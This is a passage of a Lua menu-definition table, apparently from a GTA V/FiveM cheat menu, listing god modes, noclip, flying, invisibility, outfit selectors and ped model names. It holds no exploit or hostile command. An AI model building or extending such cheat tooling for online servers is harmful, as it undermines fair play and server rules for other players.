            {text = 'Swim speed', dkey = 'player:movement_swimspeed', desc = 'Override your swim speed.', afu = __REAPER1__.M.player.movement.swimspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Swim speed number', length = 4, tipus = 'szam', func = {1.0, 1.01, 1.02, 1.03, 1.04, 1.05, 1.06, 1.07, 1.08, 1.09, 1.1, 1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.2, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26, 1.27, 1.28, 1.29, 1.3, 1.31, 1.32, 1.33, 1.34, 1.35, 1.36, 1.37, 1.38, 1.39, 1.4, 1.41, 1.42, 1.43, 1.44, 1.45, 1.46, 1.47, 1.48, 1.49}},
            {text = 'Super run', dkey = 'player:movement_superrun', desc = 'Run and swim with a speed multiplier.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Super run speed number', length = 3, tipus = 'szam', toggle = false, func = __REAPER1__.T.Szazas},
            {text = 'Fast movement', dkey = 'player:movement_fastmovement', desc = 'Run and walk really fast.', afu = __REAPER1__.M.player.movement.fastmovement, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Super jump', dkey = 'player:movement_superjump', desc = 'Jump really high.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Beast jump (infinite)', dkey = 'player:movement_beastjump', desc = 'Jump like the beast. A mix of super\njump and infinite jumps.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Flying', option = __REAPER1__.M.Separator},
            {text = 'Flying', dkey = 'player:movement_flying', desc = 'Enable flying.', afu = __REAPER1__.M.player.movement.flying, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Speed', dkey = 'player:movement_wspeed', desc = 'Flying speed.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Flying speed number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Extra', dkey = 'player:movement_wextra', desc = 'Extras while flying.', afu = __REAPER1__.M.player.movement.wextra, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Flying extra name', length = 20, tipus = 'betu', func = {'None', 'Invisible', 'God', 'Invisible & God'}},
            {text = 'Super man', dkey = 'player:movement_superman', desc = 'Superman while flying.', afu = __REAPER1__.M.player.movement.superman, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Lagging', dkey = 'player:movement_wlagging', desc = 'Enable lag while flying.\nMore precise.', afu = __REAPER1__.M.player.movement.wlagging, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Noclip', option = __REAPER1__.M.Separator},
            {text = 'Noclip', dkey = 'player:movement_noclip', desc = 'Enable noclip.', afu = __REAPER1__.M.player.movement.noclip, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Speed', dkey = 'player:movement_nspeed', desc = 'Noclip speed.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Noclip speed number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Extra', dkey = 'player:movement_nextra', desc = 'Extras while noclipping.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Noclipping extra name', length = 20, tipus = 'betu', func = {'None', 'Invisible', 'God', 'Invisible & God'}},
            {text = 'Lagging', dkey = 'player:movement_nlagging', desc = 'Enable lag while noclipping.\nMore precise.', afu = __REAPER1__.M.player.movement.nlagging, option = __REAPER1__.M.Checkbox, func = false},
        },

        ['player:godmode'] = {
            {text = 'Secure god', dkey = 'player:godmode_securegod', desc = 'Toggle secure god. Safest method of\ngod modes.', afu = __REAPER1__.M.player.godmode.secgod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Invincibility', dkey = 'player:godmode_invincibility', desc = 'Toggle invincibility. Complete god mode,\ndisables ragdoll too.', afu = __REAPER1__.M.player.godmode.invincibility, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'No damage', dkey = 'player:godmode_nodamage', desc = 'Toggle no damage. Can\'t take damage.', afu = __REAPER1__.M.player.godmode.nodamage, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Demi god', dkey = 'player:godmode_demigod', desc = 'Toggle demi god. Alternative god mode.', afu = __REAPER1__.M.player.godmode.demigod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Force value', dkey = 'player:godmode_forcevalue', desc = 'The health or armour force value.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Force number', length = 20, tipus = 'szam', func = 0},
            {text = 'Force', dkey = 'player:godmode_force', desc = 'Force your health or armour to a value\ndefined.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Force type', length = 10, tipus = 'betu', toggle = false, func = {'Health', 'Armour', 'Health & Armour'}},
            {text = 'Defined god', option = __REAPER1__.M.Separator},
            {text = 'Defined god', dkey = 'player:godmode_definegod', desc = 'Toggle defined god. Will work with the\nenabled options.', afu = __REAPER1__.M.player.godmode.definegod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Bulletproof', dkey = 'player:godmode_bulletproof', desc = 'Bulletproofness for defined god.', afu = __REAPER1__.M.player.godmode.toggledefinegod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Fireproof', dkey = 'player:godmode_fireproof', desc = 'Fireproofness for defined god.', afu = __REAPER1__.M.player.godmode.toggledefinegod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Explosion proof', dkey = 'player:godmode_explosionproof', desc = 'Explosion proofness for defined god.', afu = __REAPER1__.M.player.godmode.toggledefinegod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Collision proof', dkey = 'player:godmode_collisionproof', desc = 'Collision proofness for defined god.', afu = __REAPER1__.M.player.godmode.toggledefinegod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Melee proof', dkey = 'player:godmode_meleeproof', desc = 'Melee proofness for defined god.', afu = __REAPER1__.M.player.godmode.toggledefinegod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Steam proof', dkey = 'player:godmode_steamproof', desc = 'Steam proofness for defined god.', afu = __REAPER1__.M.player.godmode.toggledefinegod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Drown proof', dkey = 'player:godmode_drownproof', desc = 'Drown proofness for defined god.', afu = __REAPER1__.M.player.godmode.toggledefinegod, option = __REAPER1__.M.Checkbox, func = false},
        },

        ['player:superpower'] = {
            {text = 'No gravity', dkey = 'player:superpower_nogravity', desc = 'Toggle your gravity.', afu = __REAPER1__.M.player.superpower.nogravity, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Ghost mode', dkey = 'player:superpower_ghostmode', desc = 'Enable so you can walk through walls,\nobjects etc...', afu = __REAPER1__.M.player.superpower.ghostmode, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Walk on water', dkey = 'player:superpower_walkonwater', desc = 'Be jesus, walk on water.', afu = __REAPER1__.M.player.superpower.walkonwater, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Shrink', dkey = 'player:superpower_shrink', desc = 'Shrink but only on your client.', afu = __REAPER1__.M.player.superpower.shrink, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'No collision', dkey = 'player:superpower_nocollision', desc = 'Completely disable your collision.', afu = __REAPER1__.M.player.superpower.nocollision, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Slap', dkey = 'player:superpower_slap', desc = 'Slap yourself :flushed:.', afu = __REAPER1__.M.player.superpower.slap, option = __REAPER1__.M.Button},
        },

        ['player:skin'] = {
            {text = 'Saved outfits', dkey = 'player:skin:savedoutfits', desc = 'Saved outfits menu.', option = __REAPER1__.M.Menu_Button, func = {'player:skin', 'player:skin:savedoutfits'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Random outfit', dkey = 'player:skin_randomoutfit', desc = 'Set a random outfit.', afu = __REAPER1__.M.player.skin.randomoutfit, option = __REAPER1__.M.Button},
            {text = 'Default outfit', dkey = 'player:skin_defaultoutfit', desc = 'Set your ped\'s default outfit.', afu = __REAPER1__.M.player.skin.defaultoutfit, option = __REAPER1__.M.Button},
            {text = 'Random props', dkey = 'player:skin_randomoutfit', desc = 'Set a random outfit.', afu = __REAPER1__.M.player.skin.randomprop, option = __REAPER1__.M.Button},
            {text = 'Default props', dkey = 'player:skin_randomoutfit', desc = 'Set a random outfit.', afu = __REAPER1__.M.player.skin.defaultprop, option = __REAPER1__.M.Button},
            {text = 'Props', option = __REAPER1__.M.Separator},
            {text = 'Hat', dkey = 'player:skin_hat', desc = 'Select a hat prop.', afu = __REAPER1__.M.player.skin.prop, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hat prop number', length = 3, tipus = 'szam', extra = 0, extra2 = 'player:skin_vhat', func = {'None'}},
            {text = 'Hat variation', dkey = 'player:skin_vhat', desc = 'Select a hat variation.', afu = __REAPER1__.M.player.skin.propvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hat variation number', length = 3, tipus = 'szam', extra = 0, extra2 = 'player:skin_hat', func = {'None'}},
            {text = 'Glass', dkey = 'player:skin_glass', desc = 'Select a glass prop.', afu = __REAPER1__.M.player.skin.prop, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Glass prop number', length = 3, tipus = 'szam', extra = 1, extra2 = 'player:skin_vglass', func = {'None'}},
            {text = 'Glass variation', dkey = 'player:skin_vglass', desc = 'Select a glass variation.', afu = __REAPER1__.M.player.skin.propvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Glass variation number', length = 3, tipus = 'szam', extra = 1, extra2 = 'player:skin_glass', func = { 'None'}},
            {text = 'Ear', dkey = 'player:skin_ear', desc = 'Select a ear prop.', afu = __REAPER1__.M.player.skin.prop, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ear prop number', length = 3, tipus = 'szam', extra = 2, extra2 = 'player:skin_vear', func = {'None'}},
            {text = 'Ear variation', dkey = 'player:skin_vear', desc = 'Select a ear variation.', afu = __REAPER1__.M.player.skin.propvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ear variation number', length = 3, tipus = 'szam', extra = 2, extra2 = 'player:skin_ear', func = {'None'}},
            {text = 'Watch', dkey = 'player:skin_watch', desc = 'Select a watch prop.', afu = __REAPER1__.M.player.skin.prop, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Watch prop number', length = 3, tipus = 'szam', extra = 6, extra2 = 'player:skin_vwatch', func = {'None'}},
            {text = 'Watch variation', dkey = 'player:skin_vwatch', desc = 'Select a watch variation.', afu = __REAPER1__.M.player.skin.propvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Watch variation number', length = 3, tipus = 'szam', extra = 6, extra2 = 'player:skin_watch', func = {'None'}},
            {text = 'Bracelet', dkey = 'player:skin_bracelet', desc = 'Select a bracelet prop.', afu = __REAPER1__.M.player.skin.prop, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bracelet prop number', length = 3, tipus = 'szam', extra = 7, extra2 = 'player:skin_vbracelet', func = {'None'}},
            {text = 'Bracelet variation', dkey = 'player:skin_vbracelet', desc = 'Select a bracelet variation.', afu = __REAPER1__.M.player.skin.propvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bracelet variation number', length = 3, tipus = 'szam', extra = 7, extra2 = 'player:skin_bracelet', func = {'None'}},
            {text = 'Clear hat', dkey = 'player:skin_clearhat', desc = 'Clear your current hat prop.', afu = __REAPER1__.M.player.skin.clearprop, option = __REAPER1__.M.Button, extra = 0},
            {text = 'Clear glass', dkey = 'player:skin_clearhat', desc = 'Clear your current glass prop.', afu = __REAPER1__.M.player.skin.clearprop, option = __REAPER1__.M.Button, extra = 1},
            {text = 'Clear ear', dkey = 'player:skin_clearhat', desc = 'Clear your current ear prop.', afu = __REAPER1__.M.player.skin.clearprop, option = __REAPER1__.M.Button, extra = 2},
            {text = 'Clear watch', dkey = 'player:skin_clearhat', desc = 'Clear your current watch prop.', afu = __REAPER1__.M.player.skin.clearprop, option = __REAPER1__.M.Button, extra = 6},
            {text = 'Clear bracelet', dkey = 'player:skin_clearhat', desc = 'Clear your current bracelet prop.', afu = __REAPER1__.M.player.skin.clearprop, option = __REAPER1__.M.Button, extra = 7},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Face', dkey = 'player:skin_face', desc = 'Select a face component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Face component number', length = 3, tipus = 'szam', extra = 0, extra2 = 'player:skin_vface', func = {'None'}},
            {text = 'Face variation', dkey = 'player:skin_vface', desc = 'Select a face variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Face variation number', length = 3, tipus = 'szam', extra = 0, extra2 = 'player:skin_face', func = {'None'}},
            {text = 'Mask', dkey = 'player:skin_mask', desc = 'Select a mask component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Mask component number', length = 3, tipus = 'szam', extra = 1, extra2 = 'player:skin_vmask', func = {'None'}},
            {text = 'Mask variation', dkey = 'player:skin_vmask', desc = 'Select a mask variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Mask variation number', length = 3, tipus = 'szam', extra = 1, extra2 = 'player:skin_mask', func = {'None'}},
            {text = 'Hair', dkey = 'player:skin_hair', desc = 'Select a hair component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hair component number', length = 3, tipus = 'szam', extra = 2, extra2 = 'player:skin_vhair', func = {'None'}},
            {text = 'Hair variation', dkey = 'player:skin_vhair', desc = 'Select a hair variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hair variation number', length = 3, tipus = 'szam', extra = 2, extra2 = 'player:skin_hair', func = {'None'}},
            {text = 'Torso', dkey = 'player:skin_torso', desc = 'Select a torso component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Torso component number', length = 3, tipus = 'szam', extra = 3, extra2 = 'player:skin_vtorso', func = {'None'}},
            {text = 'Torso variation', dkey = 'player:skin_vtorso', desc = 'Select a torso variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Torso variation number', length = 3, tipus = 'szam', extra = 3, extra2 = 'player:skin_torso', func = {'None'}},
            {text = 'Leg', dkey = 'player:skin_leg', desc = 'Select a leg component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Leg component number', length = 3, tipus = 'szam', extra = 4, extra2 = 'player:skin_vleg', func = {'None'}},
            {text = 'Leg variation', dkey = 'player:skin_vleg', desc = 'Select a leg variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Leg variation number', length = 3, tipus = 'szam', extra = 4, extra2 = 'player:skin_leg', func = {'None'}},
            {text = 'Parachute', dkey = 'player:skin_parachute', desc = 'Select a parachute component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Parachute component number', length = 3, tipus = 'szam', extra = 5, extra2 = 'player:skin_vparachute', func = {'None'}},
            {text = 'Parachute variation', dkey = 'player:skin_vparachute', desc = 'Select a parachute variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Parachute variation number', length = 3, tipus = 'szam', extra = 5, extra2 = 'player:skin_parachute', func = {'None'}},
            {text = 'Shoe', dkey = 'player:skin_shoe', desc = 'Select a shoe component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Shoe component number', length = 3, tipus = 'szam', extra = 6, extra2 = 'player:skin_vshoe', func = {'None'}},
            {text = 'Shoe variation', dkey = 'player:skin_vshoe', desc = 'Select a shoe variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Shoe variation number', length = 3, tipus = 'szam', extra = 6, extra2 = 'player:skin_shoe', func = {'None'}},
            {text = 'Accessory', dkey = 'player:skin_accessory', desc = 'Select a accessory component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Accessory component number', length = 3, tipus = 'szam', extra = 7, extra2 = 'player:skin_vaccessory', func = {'None'}},
            {text = 'Accessory variation', dkey = 'player:skin_vaccessory', desc = 'Select a accessory variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Accessory variation number', length = 3, tipus = 'szam', extra = 7, extra2 = 'player:skin_accessory', func = {'None'}},
            {text = 'Undershirt', dkey = 'player:skin_undershirt', desc = 'Select a undershirt component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Undershirt component number', length = 3, tipus = 'szam', extra = 8, extra2 = 'player:skin_vundershirt', func = {'None'}},
            {text = 'Undershirt variation', dkey = 'player:skin_vundershirt', desc = 'Select a undershirt variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Undershirt variation number', length = 3, tipus = 'szam', extra = 8, extra2 = 'player:skin_undershirt', func = {'None'}},
            {text = 'Kevlar', dkey = 'player:skin_kevlar', desc = 'Select a kevlar component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Kevlar component number', length = 3, tipus = 'szam', extra = 9, extra2 = 'player:skin_vkevlar', func = {'None'}},
            {text = 'Kevlar variation', dkey = 'player:skin_vkevlar', desc = 'Select a kevlar variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Kevlar variation number', length = 3, tipus = 'szam', extra = 9, extra2 = 'player:skin_kevlar', func = {'None'}},
            {text = 'Badge', dkey = 'player:skin_badge', desc = 'Select a badge component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Badge component number', length = 3, tipus = 'szam', extra = 10, extra2 = 'player:skin_vbadge', func = {'None'}},
            {text = 'Badge variation', dkey = 'player:skin_vbadge', desc = 'Select a badge variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Badge variation number', length = 3, tipus = 'szam', extra = 10, extra2 = 'player:skin_badge', func = {'None'}},
            {text = 'Torso 2', dkey = 'player:skin_torso2', desc = 'Select a torso 2 component.', afu = __REAPER1__.M.player.skin.comp, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Torso 2 component number', length = 3, tipus = 'szam', extra = 11, extra2 = 'player:skin_vtorso2', func = {'None'}},
            {text = 'Torso 2 variation', dkey = 'player:skin_vtorso2', desc = 'Select a torso 2 variation.', afu = __REAPER1__.M.player.skin.compvar, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Torso 2 variation number', length = 3, tipus = 'szam', extra = 11, extra2 = 'player:skin_torso2', func = {'None'}},
        },
            
        ['player:skin:savedoutfits'] = {
            {text = 'Save outfit', dkey = 'player:skin:savedoutfits_saveoutfit', desc = 'Save your current outfit.', afu = __REAPER1__.M.player.skin.saved.save, option = __REAPER1__.M.Button},
        },
        
        ['player:model'] = {
            {text = 'Custom model', dkey = 'player:model_custommodel', desc = 'A model name for your ped.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Button_Textbox, textboxtext = 'The ped model name', length = 50, tipus = 'vegyes', func = 'None'},
            {text = 'Ambient female', dkey = 'player:model_ambientfemale', desc = 'Choose a ped model from the\nambient female category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ambient female ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'a_f_m_beach_01', 'a_f_m_bevhills_01', 'a_f_m_bevhills_02', 'a_f_m_bodybuild_01', 'a_f_m_business_02', 'a_f_m_downtown_01', 'a_f_m_eastsa_01', 'a_f_m_eastsa_02', 'a_f_m_fatbla_01', 'a_f_m_fatcult_01', 'a_f_m_fatwhite_01', 'a_f_m_ktown_01', 'a_f_m_ktown_02', 'a_f_m_prolhost_01', 'a_f_m_salton_01', 'a_f_m_skidrow_01', 'a_f_m_soucent_01', 'a_f_m_soucent_02', 'a_f_m_soucentmc_01', 'a_f_m_tourist_01', 'a_f_m_tramp_01', 'a_f_m_trampbeac_01', 'a_f_o_genstreet_01', 'a_f_o_indian_01', 'a_f_o_ktown_01', 'a_f_o_salton_01', 'a_f_o_soucent_01', 'a_f_o_soucent_02', 'a_f_y_beach_01', 'a_f_y_bevhills_01', 'a_f_y_bevhills_02', 'a_f_y_bevhills_03', 'a_f_y_bevhills_04', 'a_f_y_business_01', 'a_f_y_business_02', 'a_f_y_business_03', 'a_f_y_business_04', 'a_f_y_clubcust_01', 'a_f_y_clubcust_02', 'a_f_y_clubcust_03', 'a_f_y_eastsa_01', 'a_f_y_eastsa_02', 'a_f_y_eastsa_03', 'a_f_y_epsilon_01', 'a_f_y_femaleagent', 'a_f_y_fitness_01', 'a_f_y_fitness_02', 'a_f_y_genhot_01', 'a_f_y_golfer_01', 'a_f_y_hiker_01', 'a_f_y_hippie_01', 'a_f_y_hipster_01', 'a_f_y_hipster_02', 'a_f_y_hipster_03', 'a_f_y_hipster_04', 'a_f_y_indian_01', 'a_f_y_juggalo_01', 'a_f_y_runner_01', 'a_f_y_rurmeth_01', 'a_f_y_scdressy_01', 'a_f_y_skater_01', 'a_f_y_soucent_01', 'a_f_y_soucent_02', 'a_f_y_soucent_03', 'a_f_y_tennis_01', 'a_f_y_topless_01', 'a_f_y_tourist_01', 'a_f_y_tourist_02', 'a_f_y_vinewood_01', 'a_f_y_vinewood_02', 'a_f_y_vinewood_03', 'a_f_y_vinewood_04', 'a_f_y_yoga_01', 'a_f_y_gencaspat_01', 'a_f_y_smartcaspat_01'}},
            {text = 'Ambient male', dkey = 'player:model_ambientmale', desc = 'Choose a ped model from the\nambient male category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ambient male ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'a_m_m_acult_01', 'a_m_m_afriamer_01', 'a_m_m_beach_01', 'a_m_m_beach_02', 'a_m_m_bevhills_01', 'a_m_m_bevhills_02', 'a_m_m_business_01', 'a_m_m_eastsa_01', 'a_m_m_eastsa_02', 'a_m_m_farmer_01', 'a_m_m_fatlatin_01', 'a_m_m_genfat_01', 'a_m_m_genfat_02', 'a_m_m_golfer_01', 'a_m_m_hasjew_01', 'a_m_m_hillbilly_01', 'a_m_m_hillbilly_02', 'a_m_m_indian_01', 'a_m_m_ktown_01', 'a_m_m_malibu_01', 'a_m_m_mexcntry_01', 'a_m_m_mexlabor_01', 'a_m_m_og_boss_01', 'a_m_m_paparazzi_01', 'a_m_m_polynesian_01', 'a_m_m_prolhost_01', 'a_m_m_rurmeth_01', 'a_m_m_salton_01', 'a_m_m_salton_02', 'a_m_m_salton_03', 'a_m_m_salton_04', 'a_m_m_skater_01', 'a_m_m_skidrow_01', 'a_m_m_socenlat_01', 'a_m_m_soucent_01', 'a_m_m_soucent_02', 'a_m_m_soucent_03', 'a_m_m_soucent_04', 'a_m_m_stlat_02', 'a_m_m_tennis_01', 'a_m_m_tourist_01', 'a_m_m_tramp_01', 'a_m_m_trampbeac_01', 'a_m_m_tranvest_01', 'a_m_m_tranvest_02', 'a_m_o_acult_01', 'a_m_o_acult_02', 'a_m_o_beach_01', 'a_m_o_genstreet_01', 'a_m_o_ktown_01', 'a_m_o_salton_01', 'a_m_o_soucent_01', 'a_m_o_soucent_02', 'a_m_o_soucent_03', 'a_m_o_tramp_01', 'a_m_y_acult_01', 'a_m_y_acult_02', 'a_m_y_beach_01', 'a_m_y_beach_02', 'a_m_y_beach_03', 'a_m_y_beachvesp_01', 'a_m_y_beachvesp_02', 'a_m_y_bevhills_01', 'a_m_y_bevhills_02', 'a_m_y_breakdance_01', 'a_m_y_busicas_01', 'a_m_y_business_01', 'a_m_y_business_02', 'a_m_y_business_03', 'a_m_y_clubcust_01', 'a_m_y_clubcust_02', 'a_m_y_clubcust_03', 'a_m_y_cyclist_01', 'a_m_y_dhill_01', 'a_m_y_downtown_01', 'a_m_y_eastsa_01', 'a_m_y_eastsa_02', 'a_m_y_epsilon_01', 'a_m_y_epsilon_02', 'a_m_y_gay_01', 'a_m_y_gay_02', 'a_m_y_genstreet_01', 'a_m_y_genstreet_02', 'a_m_y_golfer_01', 'a_m_y_hasjew_01', 'a_m_y_hiker_01', 'a_m_y_hippy_01', 'a_m_y_hipster_01', 'a_m_y_hipster_02', 'a_m_y_hipster_03', 'a_m_y_indian_01', 'a_m_y_jetski_01', 'a_m_y_juggalo_01', 'a_m_y_ktown_01', 'a_m_y_ktown_02', 'a_m_y_latino_01', 'a_m_y_methhead_01', 'a_m_y_mexthug_01', 'a_m_y_motox_01', 'a_m_y_motox_02', 'a_m_y_musclbeac_01', 'a_m_y_musclbeac_02', 'a_m_y_polynesian_01', 'a_m_y_roadcyc_01', 'a_m_y_runner_01', 'a_m_y_runner_02', 'a_m_y_salton_01', 'a_m_y_skater_01', 'a_m_y_skater_02', 'a_m_y_soucent_01', 'a_m_y_soucent_02', 'a_m_y_soucent_03', 'a_m_y_soucent_04', 'a_m_y_stbla_01', 'a_m_y_stbla_02', 'a_m_y_stlat_01', 'a_m_y_stwhi_01', 'a_m_y_stwhi_02', 'a_m_y_sunbathe_01', 'a_m_y_surfer_01', 'a_m_y_vindouche_01', 'a_m_y_vinewood_01', 'a_m_y_vinewood_02', 'a_m_y_vinewood_03', 'a_m_y_vinewood_04', 'a_m_y_yoga_01', 'a_m_m_mlcrisis_01', 'a_m_y_gencaspat_01', 'a_m_y_smartcaspat_01'}},
            {text = 'Animals', dkey = 'player:model_animals', desc = 'Choose a ped model from the\nanimals category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Animal ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'a_c_boar', 'a_c_cat_01', 'a_c_chickenhawk', 'a_c_chimp', 'a_c_chop', 'a_c_cormorant', 'a_c_cow', 'a_c_coyote', 'a_c_crow', 'a_c_deer', 'a_c_dolphin', 'a_c_fish', 'a_c_hen', 'a_c_humpback', 'a_c_husky', 'a_c_killerwhale', 'a_c_mtlion', 'a_c_pig', 'a_c_pigeon', 'a_c_poodle', 'a_c_pug', 'a_c_rabbit_01', 'a_c_rat', 'a_c_retriever', 'a_c_rhesus', 'a_c_rottweiler', 'a_c_seagull', 'a_c_sharkhammer', 'a_c_sharktiger', 'a_c_shepherd', 'a_c_stingray', 'a_c_westy'}},
            {text = 'Cutsene', dkey = 'player:model_cutsene', desc = 'Choose a ped model from the\ncutsene category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Cutsene ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'cs_amandatownley', 'cs_andreas', 'cs_ashley', 'cs_bankman', 'cs_barry', 'cs_beverly', 'cs_brad', 'cs_bradcadaver', 'cs_carbuyer', 'cs_casey', 'cs_chengsr', 'cs_chrisformage', 'cs_clay', 'cs_dale', 'cs_davenorton', 'cs_debra', 'cs_denise', 'cs_devin', 'cs_dom', 'cs_dreyfuss', 'cs_drfriedlander', 'cs_fabien', 'cs_fbisuit_01', 'cs_floyd', 'cs_guadalope', 'cs_gurk', 'cs_hunter', 'cs_janet', 'cs_jewelass', 'cs_jimmyboston', 'cs_jimmydisanto', 'cs_joeminuteman', 'cs_johnnyklebitz', 'cs_josef', 'cs_josh', 'cs_karen_daniels', 'cs_lamardavis', 'cs_lazlow', 'cs_lazlow_2', 'cs_lestercrest', 'cs_lifeinvad_01', 'cs_magenta', 'cs_manuel', 'cs_marnie', 'cs_martinmadrazo', 'cs_maryann', 'cs_michelle', 'cs_milton', 'cs_molly', 'cs_movpremf_01', 'cs_movpremmale', 'cs_mrk', 'cs_mrs_thornhill', 'cs_mrsphillips', 'cs_natalia', 'cs_nervousron', 'cs_nigel', 'cs_old_man1a', 'cs_old_man2', 'cs_omega', 'cs_orleans', 'cs_paper', 'cs_patricia', 'cs_priest', 'cs_prolsec_02', 'cs_russiandrunk', 'cs_siemonyetarian', 'cs_solomon', 'cs_stevehains', 'cs_stretch', 'cs_tanisha', 'cs_taocheng', 'cs_taostranslator', 'cs_tenniscoach', 'cs_terry', 'cs_tom', 'cs_tomepsilon', 'cs_tracydisanto', 'cs_wade', 'cs_zimbor', 'csb_abigail', 'csb_agent', 'csb_alan', 'csb_anita', 'csb_anton', 'csb_avon', 'csb_ballasog', 'csb_bogdan', 'csb_bride', 'csb_bryony', 'csb_burgerdrug', 'csb_car3guy1', 'csb_car3guy2', 'csb_chef', 'csb_chef2', 'csb_chin_goon', 'csb_cletus', 'csb_cop', 'csb_customer', 